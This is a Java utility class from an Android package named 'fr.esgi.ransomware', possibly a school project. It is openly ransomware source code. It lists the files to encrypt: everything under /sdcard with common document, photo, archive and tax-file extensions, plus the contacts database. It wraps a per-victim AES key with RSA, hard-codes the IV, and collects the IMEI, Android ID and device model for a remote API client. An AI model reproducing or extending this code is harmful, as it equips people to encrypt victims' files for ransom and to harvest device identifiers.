package fr.esgi.ransomware;

import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Base64;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.security.KeyFactory;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.spec.PKCS8EncodedKeySpec;
import java.security.spec.X509EncodedKeySpec;
import java.util.Arrays;

import javax.crypto.Cipher;

import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

public class Util {

    private static final String SHAREDPREF_AES = "AES";
    private static final String SHAREDPREF_UUID = "UUID";


    public static final String RSA_ALG = "RSA/ECB/PKCS1Padding";
    public static final String AES_ALG = "AES/CBC/PKCS5Padding";

    public static Uri[] URI_TO_REKT = new Uri[]{
            ContactsContract.Contacts.CONTENT_URI,
            ContactsContract.Data.CONTENT_URI
    };


    public static final String PATH_TO_REKT = "/sdcard";
    public static final String PREFIX_FILE_REKT = "rekt_";

    //https://fileinfo.com/filetypes/common
    public static final String[] EXTENSIONS_TO_REKT = new String[]{
            "3DM", "3DS", "MAX", "OBJ",                                                                                     //3D Image
            "BMP", "DDS", "GIF", "JPG", "PNG", "PSD", "PSPIMAGE", "TGA", "THM", "TIF", "TIFF", "YUV",                       //Image
            "7Z", "CBR", "DEB", "GZ", "PKG", "RAR", "RPM", "SITX", "TAR.GZ", "ZIP", "ZIPX",                                 //Compressed
            "3G2", "3GP", "ASF", "AVI", "FLV", "M4V", "MOV", "MP4", "MPG", "RM", "SRT", "SWF", "VOB", "WMV",                //Video
            "AIF", "IFF", "M3U", "M4A", "MID", "MP3", "MPA", "WAV", "WMA",                                                  //Audio
            "CSV", "DAT", "GED", "KEY", "KEYCHAIN", "PPS", "PPT", "PPTX", "SDF", "TAR", "TAX2016", "TAX2017", "VCF", "XML", //Data
            "DOC", "DOCX", "LOG", "MSG", "ODT", "PAGES", "RTF", "TEX", "TXT", "WPD", "WPS"                                  //Text
    };

    public static final int AES_KEY_SIZE = 256;

    public static final String IV = "EVe1qUFKQvZLoffw";

    public static PublicKey loadPublicKey(String base64) throws Exception {
        byte[] bytes = Base64.decode(base64, Base64.DEFAULT);
        X509EncodedKeySpec spec = new X509EncodedKeySpec(bytes);
        KeyFactory kf = KeyFactory.getInstance("RSA");
        return kf.generatePublic(spec);
    }

    public static PrivateKey loadPrivateKey(String base64) throws Exception {
        byte[] bytes = Base64.decode(base64, Base64.DEFAULT);
        PKCS8EncodedKeySpec spec = new PKCS8EncodedKeySpec(bytes);
        KeyFactory kf = KeyFactory.getInstance("RSA");
        return kf.generatePrivate(spec);
    }


    public static void saveAesKey(byte[] aesKey, PublicKey publicKey, Context context) throws Exception {
        Cipher rsaCipher = Cipher.getInstance(Util.RSA_ALG);
        rsaCipher.init(Cipher.ENCRYPT_MODE, publicKey);

        byte[] aesEncrypted = rsaCipher.doFinal(aesKey);
        String aesEncryptedString = Arrays.toString(aesEncrypted);

        SharedPreferences sharedPreferences = getSharedPreferences(context);
        sharedPreferences.edit().putString(SHAREDPREF_AES, aesEncryptedString).commit();
    }

    public static void saveUUID(String uuid, Context context) {
        SharedPreferences sharedPreferences = getSharedPreferences(context);
        sharedPreferences.edit().putString(SHAREDPREF_UUID, uuid).commit();
    }

    public static byte[] loadAesKey(PrivateKey privateKey, Context context) throws Exception {
        Cipher rsaCipher = Cipher.getInstance(Util.RSA_ALG);
        rsaCipher.init(Cipher.DECRYPT_MODE, privateKey);


        SharedPreferences sharedPreferences = getSharedPreferences(context);
        String aesEncryptedString = sharedPreferences.getString(SHAREDPREF_AES, null);
        if (aesEncryptedString == null) throw new RuntimeException("NO AES KEY");

        String[] split = aesEncryptedString.substring(1, aesEncryptedString.length() - 1).split(", ");
        byte[] aesEncrypted = new byte[split.length];
        for (int i = 0; i < split.length; i++) {
            aesEncrypted[i] = Byte.parseByte(split[i]);
        }

        return rsaCipher.doFinal(aesEncrypted);
    }

    public static String loadUUID(Context context) {
        return getSharedPreferences(context).getString(SHAREDPREF_UUID, null);
    }

    public static boolean isRekt(Context context) {
        SharedPreferences sharedPreferences = getSharedPreferences(context);

        return sharedPreferences.getString(SHAREDPREF_AES, null) != null;
    }

    public static void cleanAesKey(Context context) {
        SharedPreferences sharedPreferences = getSharedPreferences(context);
        sharedPreferences.edit()
                .remove(SHAREDPREF_AES)
                .remove(SHAREDPREF_UUID)
                .commit();
    }

    private static SharedPreferences getSharedPreferences(Context context) {
        return context.getSharedPreferences("APP", Context.MODE_PRIVATE);
    }


    public static void copyStream(InputStream is, OutputStream os) throws IOException {
        int i;
        byte[] b = new byte[1024];
        while ((i = is.read(b)) != -1) {
            os.write(b, 0, i);
        }
    }

    public static void sendLogMessage(Handler handler, String log) {
        handler.obtainMessage(42, log).sendToTarget();
    }

    public static String getOsVersion() {
        return Build.VERSION.RELEASE;
    }

    public static String getDeviceVersion() {
        return (Build.MANUFACTURER + "-" + Build.MODEL).replaceAll(" ", "_").toLowerCase();
    }

    public static String getDeviceToken(ContentResolver contentResolver) {
        return Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID);
    }

    public static String getImei(Context context) {
        return ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();
    }

    public static ApiService newRetrofitService() {
        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(ApiService.BASE_URL)
                .addConverterFactory(GsonConverterFactory.create())
                .build();

        return retrofit.create(ApiService.class);
    }

}
